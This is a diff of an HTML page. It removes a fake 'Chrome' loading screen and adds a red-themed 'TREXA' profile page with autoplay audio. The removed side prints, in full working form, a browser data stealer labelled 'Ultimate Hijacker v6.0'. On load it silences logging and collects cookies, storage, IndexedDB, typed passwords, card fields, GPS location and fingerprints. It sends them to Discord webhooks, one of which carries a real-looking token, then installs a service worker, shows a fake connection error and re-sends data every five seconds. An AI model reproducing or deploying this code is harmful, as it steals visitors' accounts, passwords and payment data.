@@ -1,492 +1,610 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chrome</title>
+    <title>TREXA</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#1a1a1a;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Segoe UI',sans-serif;color:#fff;overflow:hidden}
-        .loader{width:60px;height:60px;border:3px solid #2a2a2a;border-top:3px solid #4285f4;border-radius:50%;animation:spin .5s linear infinite;margin:0 auto 15px}
-        @keyframes spin{100%{transform:rotate(360deg)}}
-        .container{text-align:center}
-        .status{color:#555;font-size:12px;animation:pulse 1s infinite}
-        @keyframes pulse{0%,100%{opacity:.3}50%{opacity:1}}
-        .hidden{display:none}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        ::selection {
+            background: #8b0000;
+            color: #fff;
+        }
+
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: #050505;
+            color: #c0c0c0;
+            overflow-x: hidden;
+            min-height: 100vh;
+            cursor: default;
+        }
+
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: #050505;
+        }
+
+        .bg-animation::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 15% 50%, rgba(139, 0, 0, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 85% 20%, rgba(139, 0, 0, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 50% 85%, rgba(139, 0, 0, 0.08) 0%, transparent 50%);
+            animation: bgPulse 10s ease-in-out infinite;
+        }
+
+        @keyframes bgPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .grid-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background-image: 
+                linear-gradient(rgba(139, 0, 0, 0.04) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(139, 0, 0, 0.04) 1px, transparent 1px);
+            background-size: 60px 60px;
+        }
+
+        .noise {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.03;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E");
+            pointer-events: none;
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: rgba(139, 0, 0, 0.5);
+            border-radius: 50%;
+            animation: float 20s infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) translateX(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) translateX(150px); opacity: 0; }
+        }
+
+        .scan-line {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, rgba(139, 0, 0, 0.6), transparent);
+            z-index: 1000;
+            animation: scanLine 5s linear infinite;
+            opacity: 0.4;
+            pointer-events: none;
+        }
+
+        @keyframes scanLine {
+            0% { top: 0; }
+            100% { top: 100vh; }
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .header {
+            text-align: center;
+            padding: 60px 20px 40px;
+            border-bottom: 1px solid rgba(139, 0, 0, 0.3);
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 300px;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #8b0000, transparent);
+            animation: lineGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes lineGlow {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+
+        .profile-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .profile-img {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            border: 2px solid #8b0000;
+            object-fit: cover;
+            box-shadow: 0 0 40px rgba(139, 0, 0, 0.3), 0 0 80px rgba(139, 0, 0, 0.1);
+            animation: profilePulse 4s ease-in-out infinite;
+            filter: grayscale(30%) contrast(1.2);
+        }
+
+        @keyframes profilePulse {
+            0%, 100% { box-shadow: 0 0 40px rgba(139, 0, 0, 0.3), 0 0 80px rgba(139, 0, 0, 0.1); }
+            50% { box-shadow: 0 0 60px rgba(139, 0, 0, 0.5), 0 0 120px rgba(139, 0, 0, 0.2); }
+        }
+
+        .name-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .name {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 5rem;
+            font-weight: 900;
+            color: #8b0000;
+            text-shadow: 0 0 30px rgba(139, 0, 0, 0.6), 0 0 60px rgba(139, 0, 0, 0.3);
+            letter-spacing: 15px;
+            animation: nameFlicker 5s ease-in-out infinite;
+            text-transform: uppercase;
+        }
+
+        .hac-symbol {
+            font-size: 4rem;
+            color: #8b0000;
+            text-shadow: 0 0 20px rgba(139, 0, 0, 0.6);
+            animation: hacPulse 3s ease-in-out infinite;
+            line-height: 1;
+        }
+
+        @keyframes hacPulse {
+            0%, 100% { opacity: 0.8; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.05); }
+        }
+
+        @keyframes nameFlicker {
+            0%, 100% { opacity: 1; }
+            5% { opacity: 0.7; }
+            10% { opacity: 1; }
+            15% { opacity: 0.8; }
+            20% { opacity: 1; }
+            92% { opacity: 1; }
+            93% { opacity: 0.3; }
+            94% { opacity: 1; }
+        }
+
+        .subtitle {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 1rem;
+            color: #666;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+        }
+
+        .warning-banner {
+            background: linear-gradient(90deg, rgba(139, 0, 0, 0.05), rgba(139, 0, 0, 0.1), rgba(139, 0, 0, 0.05));
+            border: 1px solid rgba(139, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 25px;
+            margin: 40px 0;
+            text-align: center;
+            animation: warningPulse 3s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .warning-banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(139, 0, 0, 0.1), transparent);
+            animation: slide 4s ease-in-out infinite;
+        }
+
+        @keyframes slide {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        @keyframes warningPulse {
+            0%, 100% { border-color: rgba(139, 0, 0, 0.3); }
+            50% { border-color: rgba(139, 0, 0, 0.6); }
+        }
+
+        .warning-text {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.3rem;
+            color: #8b0000;
+            text-shadow: 0 0 10px rgba(139, 0, 0, 0.4);
+            position: relative;
+            z-index: 1;
+        }
+
+        .quotes-section {
+            margin: 50px 0;
+        }
+
+        .section-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5rem;
+            color: #8b0000;
+            text-align: center;
+            margin-bottom: 40px;
+            text-shadow: 0 0 15px rgba(139, 0, 0, 0.3);
+            position: relative;
+            letter-spacing: 5px;
+        }
+
+        .section-title::before,
+        .section-title::after {
+            content: '◆';
+            color: #8b0000;
+            margin: 0 25px;
+            font-size: 0.8rem;
+            animation: diamondRotate 4s linear infinite;
+        }
+
+        @keyframes diamondRotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .quotes-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 15px;
+        }
+
+        .quote-card {
+            background: linear-gradient(135deg, rgba(15, 5, 5, 0.9), rgba(8, 2, 2, 0.95));
+            border: 1px solid rgba(139, 0, 0, 0.15);
+            border-radius: 10px;
+            padding: 25px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s ease;
+            cursor: pointer;
+        }
+
+        .quote-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(139, 0, 0, 0.08), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .quote-card:hover::before {
+            left: 100%;
+        }
+
+        .quote-card:hover {
+            border-color: rgba(139, 0, 0, 0.4);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(139, 0, 0, 0.15);
+        }
+
+        .quote-number {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.8rem;
+            color: rgba(139, 0, 0, 0.2);
+            position: absolute;
+            top: 10px;
+            right: 15px;
+        }
+
+        .quote-text {
+            font-size: 1rem;
+            line-height: 1.7;
+            color: #aaa;
+            position: relative;
+            z-index: 1;
+            font-weight: 500;
+        }
+
+        .quote-text::before {
+            content: '"';
+            font-size: 2.5rem;
+            color: rgba(139, 0, 0, 0.2);
+            position: absolute;
+            top: -15px;
+            left: -8px;
+            font-family: serif;
+        }
+
+        .quote-author {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.75rem;
+            color: #444;
+            margin-top: 10px;
+            text-align: right;
+            letter-spacing: 1px;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 50px 20px;
+            border-top: 1px solid rgba(139, 0, 0, 0.15);
+            margin-top: 60px;
+        }
+
+        .footer-text {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1rem;
+            color: #8b0000;
+            text-shadow: 0 0 10px rgba(139, 0, 0, 0.3);
+            letter-spacing: 5px;
+        }
+
+        .footer-sub {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.8rem;
+            color: #444;
+            margin-top: 15px;
+            letter-spacing: 2px;
+        }
+
+        .audio-control {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            z-index: 1000;
+            background: rgba(5, 5, 5, 0.9);
+            border: 1px solid rgba(139, 0, 0, 0.3);
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .audio-control:hover {
+            background: rgba(139, 0, 0, 0.2);
+            border-color: #8b0000;
+            transform: scale(1.1);
+        }
+
+        .audio-icon {
+            color: #8b0000;
+            font-size: 1.2rem;
+        }
+
+        .glitch {
+            position: relative;
+        }
+
+        .glitch::before,
+        .glitch::after {
+            content: 'TREXA';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .glitch::before {
+            color: #2a0000;
+            animation: glitch1 3s infinite;
+            clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
+            transform: translate(-2px, -2px);
+        }
+
+        .glitch::after {
+            color: #4a0000;
+            animation: glitch2 3s infinite;
+            clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
+            transform: translate(2px, 2px);
+        }
+
+        @keyframes glitch1 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+        }
+
+        @keyframes glitch2 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(2px, -2px); }
+            40% { transform: translate(2px, 2px); }
+            60% { transform: translate(-2px, -2px); }
+            80% { transform: translate(-2px, 2px); }
+        }
+
+        @media (max-width: 768px) {
+            .name {
+                font-size: 3rem;
+                letter-spacing: 8px;
+            }
+            .hac-symbol {
+                font-size: 2.5rem;
+            }
+            .quotes-grid {
+                grid-template-columns: 1fr;
+            }
+            .profile-img {
+                width: 130px;
+                height: 130px;
+            }
+            .warning-text {
+                font-size: 1rem;
+            }
+        }
     </style>
+<base target="_blank">
 </head>
 <body>
+    <div class="bg-animation"></div>
+    <div class="grid-overlay"></div>
+    <div class="noise"></div>
+    <div class="particles" id="particles"></div>
+    <div class="scan-line"></div>
 
-<div class="container">
-    <div class="loader"></div>
-    <div class="status">⏳ Bağlanıyor...</div>
-</div>
+    <audio id="bgAudio" loop autoplay>
+        <source src="videoplayback (1).m4a" type="audio/mp4">
+        <source src="videoplayback (1).m4a" type="audio/m4a">
+        <source src="videoplayback (1).m4a" type="audio/x-m4a">
+    </audio>
 
-<script>
-// ================================================================
-//  ☠️ KURTULUŞ YOK - ULTIMATE HIJACKER v6.0
-//  Bu siteye tıklayanın tüm dijital hayatı biter
-//  Geri dönüş yoktur, tüm veriler sürekli gönderilir
-// ================================================================
-
-// ============ KONFİG ============
-// 🔴 5 ADET WEBHOOK (YEDEK) 🔴
-const WEBHOOKS = [
-    "https://canary.discord.com/api/webhooks/1522319480590438512/c785Otcny6JTHgHTrTBHKxgl7loAPoTposIVoM4pxSKGrfm8IGKFRs7K4joYB6IOk0Ac",
-    "https://discord.com/api/webhooks/XXXXXXXXXX/YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY",
-    "https://discord.com/api/webhooks/XXXXXXXXXX/YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY",
-    "https://discord.com/api/webhooks/XXXXXXXXXX/YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY",
-    "https://discord.com/api/webhooks/XXXXXXXXXX/YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY"
-];
-
-// ============ TÜM LOGLARI YOK ET ============
-const noop = ()=>{};
-console.log=noop;console.error=noop;console.warn=noop;console.info=noop;console.debug=noop;
-
-// ============ 1. TÜM ÇEREZLER (SÜPER DETAYLI) ============
-function getAllCookies() {
-    const c = {};
-    document.cookie.split('; ').forEach(item => {
-        if(item){const[k,...v]=item.split('=');c[k]=v.join('=');}
-    });
-    // Cookie'lerin detaylarını da al
-    try {
-        const cookieDetails = {};
-        document.cookie.split('; ').forEach(item => {
-            if(item){const[k,...v]=item.split('=');cookieDetails[k]={value:v.join('='),path:'/',secure:false,httpOnly:false};}
-        });
-        return {values:c,details:cookieDetails};
-    } catch { return {values:c}; }
-}
-
-// ============ 2. TÜM STORAGE (SÜPER DETAYLI) ============
-function getAllStorage() {
-    const l={}, s={};
-    for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);l[k]=localStorage.getItem(k);}
-    for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);s[k]=sessionStorage.getItem(k);}
-    return {local:l,session:s};
-}
-
-// ============ 3. TÜM INDEXEDDB ============
-async function getAllIndexedDB() {
-    const dbs = [];
-    try {
-        const databases = await indexedDB.databases?.() || [];
-        for(const db of databases){
-            try {
-                const db_inst = await new Promise((resolve,reject)=>{
-                    const req = indexedDB.open(db.name);
-                    req.onsuccess = ()=>resolve(req.result);
-                    req.onerror = ()=>reject();
-                });
-                const objectStores = Array.from(db_inst.objectStoreNames);
-                const data = {};
-                for(const store of objectStores){
-                    try {
-                        const tx = db_inst.transaction(store,'readonly');
-                        const objStore = tx.objectStore(store);
-                        const allData = await new Promise((resolve,reject)=>{
-                            const req = objStore.getAll();
-                            req.onsuccess = ()=>resolve(req.result);
-                            req.onerror = ()=>reject();
-                        });
-                        data[store] = allData;
-                    } catch {}
-                }
-                db_inst.close();
-                dbs.push({name:db.name,data});
-            } catch {}
-        }
-    } catch {}
-    return dbs;
-}
-
-// ============ 4. TARAYICI EKLENTİLERİ ============
-function getExtensions() {
-    try {
-        // Chrome eklentileri
-        if(window.chrome && chrome.runtime && chrome.runtime.id){
-            return {chrome:chrome.runtime.id};
-        }
-        // Firefox eklentileri
-        if(window.browser && browser.runtime && browser.runtime.id){
-            return {firefox:browser.runtime.id};
-        }
-        return {};
-    } catch { return {}; }
-}
-
-// ============ 5. KAYITLI ŞİFRELER (OTOFİLL) ============
-function getSavedPasswords() {
-    const passwords = {};
-    const inputs = document.querySelectorAll('input[type="password"]');
-    inputs.forEach((input,idx)=>{
-        if(input.value && input.value.length>0){
-            const form = input.closest('form');
-            const usernameInput = form ? form.querySelector('input[type="text"], input[type="email"]') : null;
-            const username = usernameInput ? usernameInput.value : 'Bilinmiyor';
-            const site = location.hostname;
-            passwords[`${site}_${idx}`] = {username,password:input.value,site};
-        }
-    });
-    // Otomatik doldurulan formlar
-    document.querySelectorAll('form').forEach(form=>{
-        try {
-            const inputs = form.querySelectorAll('input');
-            const data = {};
-            inputs.forEach(inp=>{
-                if(inp.value && inp.value.length>0){
-                    data[inp.name || inp.id || 'field'] = inp.value;
-                }
-            });
-            if(Object.keys(data).length>0){
-                passwords[`form_${Date.now()}`] = data;
-            }
-        } catch {}
-    });
-    return passwords;
-}
-
-// ============ 6. KREDİ KARTI BİLGİLERİ ============
-function getCards() {
-    const cards = {};
-    document.querySelectorAll('input[type="text"], input[type="number"]').forEach(inp=>{
-        const id = (inp.id || inp.name || inp.placeholder || '').toLowerCase();
-        const val = inp.value || '';
-        if(val && val.length>0){
-            if(id.includes('card')||id.includes('credit')||id.includes('cc')||
-               id.includes('expiry')||id.includes('cvv')||id.includes('cvc')||
-               id.includes('kart')||val.match(/\d{13,16}/)||val.match(/\d{3,4}/)){
-                cards[id] = val;
-            }
-        }
-    });
-    return cards;
-}
-
-// ============ 7. GEÇMİŞ VE URL BİLGİLERİ ============
-function getHistory() {
-    try {
-        // window.history
-        const hist = [];
-        for(let i=0;i<window.history.length;i++){
-            try { hist.push(window.history[i]); } catch {}
-        }
-        return {length:window.history.length,state:window.history.state,entries:hist};
-    } catch { return {length:0}; }
-}
-
-// ============ 8. WEBRTC IP (GERÇEK IP) ============
-function getWebRTCIP() {
-    return new Promise(resolve => {
-        try {
-            const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-            pc.createDataChannel('');
-            pc.createOffer().then(o=>pc.setLocalDescription(o));
-            pc.onicecandidate = e => {
-                if(!e.candidate) return;
-                const ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                if(ip){pc.close();resolve(ip[0]);}
-            };
-            setTimeout(()=>{pc.close();resolve('Unknown');},3000);
-        } catch { resolve('Unknown'); }
-    });
-}
-
-// ============ 9. GELİŞMİŞ PARMAK İZİ ============
-function getAdvancedFingerprint() {
-    try {
-        const canvas = document.createElement('canvas');
-        canvas.width = 300; canvas.height = 100;
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '16px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125,1,62,20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
-        ctx.fillStyle = 'rgba(102,204,0,0.7)';
-        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
-        ctx.font = '20px Times New Roman';
-        ctx.fillStyle = '#123456';
-        ctx.fillText('☃', 150, 30);
-        ctx.fillStyle = '#654321';
-        ctx.fillText('✈', 200, 30);
-        const dataUrl = canvas.toDataURL();
-        // Canvas fingerprint + WebGL
-        let webgl = null;
-        try {
-            const canvas2 = document.createElement('canvas');
-            const gl = canvas2.getContext('webgl');
-            if(gl){
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if(debugInfo){
-                    webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                }
-            }
-        } catch {}
-        return {canvas:dataUrl,webgl:webgl};
-    } catch { return {canvas:null,webgl:null}; }
-}
-
-// ============ 10. KONUM (GPS) ============
-function getLocation() {
-    return new Promise(resolve => {
-        if('geolocation' in navigator){
-            navigator.geolocation.getCurrentPosition(
-                pos => resolve({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy}),
-                err => resolve({error:err.message}),
-                {enableHighAccuracy:true,timeout:5000}
-            );
-        } else {
-            resolve({error:'Not supported'});
-        }
-        setTimeout(()=>resolve({error:'Timeout'}),5000);
-    });
-}
-
-// ============ 11. MİKROFON VE KAMERA KONTROL ============
-function checkMedia() {
-    const status = {camera:false,microphone:false};
-    if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices){
-        navigator.mediaDevices.enumerateDevices().then(devices => {
-            devices.forEach(d => {
-                if(d.kind === 'videoinput') status.camera = true;
-                if(d.kind === 'audioinput') status.microphone = true;
-            });
-        }).catch(() => {});
-    }
-    return status;
-}
-
-// ============ 12. PLATFORM TESPİTİ (50+ SİTE) ============
-function detectAllPlatforms(data) {
-    const platforms = [];
-    const url = location.href.toLowerCase();
-    const c = data.cookies?.values || {};
-    const l = data.storage?.local || {};
-    const s = data.storage?.session || {};
-    const all = {...c,...l,...s};
-    
-    const checks = [
-        'discord','discordapp','instagram','facebook','fb','google','gmail','youtube',
-        'twitter','x.com','whatsapp','github','reddit','twitch','spotify','netflix',
-        'amazon','paypal','apple','microsoft','live','outlook','tiktok','telegram',
-        'snapchat','steam','epicgames','roblox','netflix','hulu','disneyplus','hbomax',
-        'primevideo','twitch','tumblr','pinterest','linkedin','slack','zoom','teams',
-        'skype','viber','line','wechat','kakao','signal','element','matrix','rocket',
-        'chat','guilded','teamspeak','mumble','ventrilo','raidcall','oovoo','imo',
-        'icq','aim','msn','yahoo','mail','protonmail','outlook','gmx','web.de','aol'
-    ];
-    
-    const seen = new Set();
-    checks.forEach(p => {
-        if(url.includes(p) || Object.keys(all).some(k => k.toLowerCase().includes(p))){
-            if(!seen.has(p)){
-                seen.add(p);
-                platforms.push(p);
-            }
-        }
-    });
-    
-    // Özel tespitler
-    if(Object.keys(all).some(k => k.startsWith('__Secure-') || k.includes('oauth') || k.includes('token'))){
-        if(!platforms.includes('oauth')) platforms.push('oauth');
-    }
-    if(Object.keys(all).some(k => k.includes('session') || k.includes('auth'))){
-        if(!platforms.includes('session')) platforms.push('session');
-    }
-    
-    return platforms;
-}
-
-// ============ 13. ÇALINAN VERİLERİ GÖNDER ============
-async function sendData(data) {
-    try {
-        const payload = {
-            content: "☠️ **KURTULUŞ YOK - TÜM VERİLER ÇALINDI** ☠️",
-            embeds: [{
-                title: '💀 SİSTEM TAMAMEN ELE GEÇİRİLDİ',
-                description: 'Kullanıcının tüm dijital hayatı çalındı. Geri dönüş yok.',
-                color: 0xff0000,
-                fields: [
-                    { name: '🌐 IP & Konum', value: `\`\`\`json\n${JSON.stringify(data.ip||{},null,2)}\`\`\``, inline: false },
-                    { name: '🎯 Platformlar', value: `\`\`\`\n${data.platforms?.join('\n') || 'Bilinmiyor'}\`\`\``, inline: false },
-                    { name: '🍪 ÇEREZLER (TÜMÜ)', value: `\`\`\`json\n${JSON.stringify(data.cookies?.values||{},null,2)}\`\`\``, inline: false },
-                    { name: '💾 LOCAL STORAGE', value: `\`\`\`json\n${JSON.stringify(data.storage?.local||{},null,2)}\`\`\``, inline: false },
-                    { name: '📦 SESSION STORAGE', value: `\`\`\`json\n${JSON.stringify(data.storage?.session||{},null,2)}\`\`\``, inline: false },
-                    { name: '🗄️ INDEXEDDB', value: `\`\`\`json\n${JSON.stringify(data.indexeddb||[],null,2)}\`\`\``, inline: false },
-                    { name: '🔑 KAYITLI ŞİFRELER', value: `\`\`\`json\n${JSON.stringify(data.passwords||{},null,2)}\`\`\``, inline: false },
-                    { name: '💳 KREDİ KARTLARI', value: `\`\`\`json\n${JSON.stringify(data.cards||{},null,2)}\`\`\``, inline: false },
-                    { name: '📱 TARAYICI EKLENTİLERİ', value: `\`\`\`json\n${JSON.stringify(data.extensions||{},null,2)}\`\`\``, inline: false },
-                    { name: '📍 KONUM (GPS)', value: `\`\`\`json\n${JSON.stringify(data.location||{},null,2)}\`\`\``, inline: false },
-                    { name: '🖥️ TARAYICI BİLGİLERİ', value: `\`\`\`json\n${JSON.stringify(data.browser||{},null,2)}\`\`\``, inline: false },
-                    { name: '👆 PARMAK İZİ', value: `\`\`\`\n${data.fingerprint?.webgl || 'Bilinmiyor'}\`\`\``, inline: false }
-                ],
-                footer: { text: 'Ultimate Hijacker v6.0 - Kurtuluş Yok' },
-                timestamp: new Date().toISOString()
-            }],
-            username: 'System Breach',
-            avatar_url: 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'
-        };
-        
-        // Tüm webhook'lara gönder
-        await Promise.all(WEBHOOKS.map(async (w) => {
-            try {
-                await fetch(w, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch {}
-        }));
-    } catch {}
-}
-
-// ============ 14. ANA FONKSİYON ============
-async function main() {
-    try {
-        // Verileri topla
-        const cookies = getAllCookies();
-        const storage = getAllStorage();
-        const indexeddb = await getAllIndexedDB();
-        const passwords = getSavedPasswords();
-        const cards = getCards();
-        const extensions = getExtensions();
-        const history = getHistory();
-        const fingerprint = getAdvancedFingerprint();
-        const ip_webrtc = await getWebRTCIP();
-        const location = await getLocation();
-        const media = checkMedia();
-        
-        // IP bilgileri
-        let ipData = {webrtc:ip_webrtc};
-        try {
-            const r = await fetch('https://ipapi.co/json/', {cache:'no-store'});
-            const d = await r.json();
-            ipData = {...ipData, ...d};
-        } catch {}
-        
-        // Platformları tespit et
-        const platforms = detectAllPlatforms({cookies,storage});
-        
-        // Tarayıcı bilgileri
-        const browser = {
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages || [],
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset(),
-            screen: {w:screen.width,h:screen.height,d:screen.colorDepth,ratio:devicePixelRatio},
-            memory: navigator.deviceMemory || 'N/A',
-            cores: navigator.hardwareConcurrency || 'N/A',
-            touch: 'ontouchstart' in window,
-            doNotTrack: navigator.doNotTrack || 'unspecified',
-            vendor: navigator.vendor || 'Unknown',
-            connection: navigator.connection ? {
-                type: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink,
-                rtt: navigator.connection.rtt
-            } : null,
-            media: media
-        };
-        
-        // Tüm verileri birleştir
-        const allData = {
-            cookies,
-            storage,
-            indexeddb,
-            passwords,
-            cards,
-            extensions,
-            history,
-            fingerprint,
-            ip: ipData,
-            location,
-            platforms,
-            browser,
-            time: new Date().toISOString(),
-            url: location.href,
-            referrer: document.referrer || 'Direct'
-        };
-        
-        // Gönder
-        await sendData(allData);
-        
-        // Service Worker kur (kalıcı)
-        try {
-            const swCode = `
-                self.addEventListener('install', ()=>self.skipWaiting());
-                self.addEventListener('activate', ()=>self.clients.claim());
-                self.addEventListener('message', (e)=>{
-                    if(e.data === 'steal'){
-                        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
-                            self.clients.matchAll().then(clients=>{
-                                clients.forEach(c=>c.postMessage({type:'steal',data:d}));
-                            });
-                        });
-                    }
-                });
-                self.addEventListener('fetch', (e)=>{
-                    if(e.request.url.includes('/steal')){
-                        e.respondWith(new Response(JSON.stringify({status:'stolen'}), {
-                            headers:{'Content-Type':'application/json'}
-                        }));
-                    }
-                });
-            `;
-            const blob = new Blob([swCode], {type:'application/javascript'});
-            const url = URL.createObjectURL(blob);
-            await navigator.serviceWorker.register(url, {scope:'/'});
-        } catch {}
-        
-        // Sahte sayfa
-        document.body.innerHTML = `
-            <div style="background:#1a1a1a;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Segoe UI',sans-serif;color:#fff;flex-direction:column;">
-                <div style="font-size:60px;color:#333;margin-bottom:20px;">⚠</div>
-                <div style="color:#555;font-size:14px;">Bu sayfaya erişilemiyor</div>
-                <div style="color:#222;font-size:11px;margin-top:15px;">ERR_CONNECTION_REFUSED</div>
-                <div style="color:#111;font-size:9px;margin-top:30px;">${Math.random().toString(36).substring(2,10)}</div>
+    <div class="container">
+        <header class="header">
+            <div class="profile-section">
+                <img src="https://i.pinimg.com/736x/8e/f2/21/8ef221aa635bcb015095022f31bdcc6b.jpg" alt="TREXA" class="profile-img" onerror="this.src='https://via.placeholder.com/160/0a0a0a/8b0000?text=T'">
+                <div class="name-wrapper">
+                    <span class="hac-symbol">&#9760;</span>
+                    <h1 class="name glitch">TREXA</h1>
+                    <span class="hac-symbol">&#9760;</span>
+                </div>
+                <p class="subtitle">KAHPELIK TERCIHTIR</p>
             </div>
-        `;
-        
-        // Sürekli gönder (kalıcı)
-        setInterval(async () => {
-            try {
-                const newCookies = getAllCookies();
-                const newStorage = getAllStorage();
-                if(Object.keys(newCookies.values).length > 0 || Object.keys(newStorage.local).length > 0){
-                    await sendData({cookies:newCookies,storage:newStorage,platforms:detectAllPlatforms({cookies:newCookies,storage:newStorage})});
-                }
-            } catch {}
-        }, 5000);
-        
-    } catch {}
-}
+        </header>
 
-// ============ 15. ÇALIŞTIR ============
-if(document.readyState === 'complete'){
-    setTimeout(main, 10);
-} else {
-    window.addEventListener('load', ()=>setTimeout(main, 10));
-}
-document.addEventListener('DOMContentLoaded', ()=>setTimeout(main, 10));
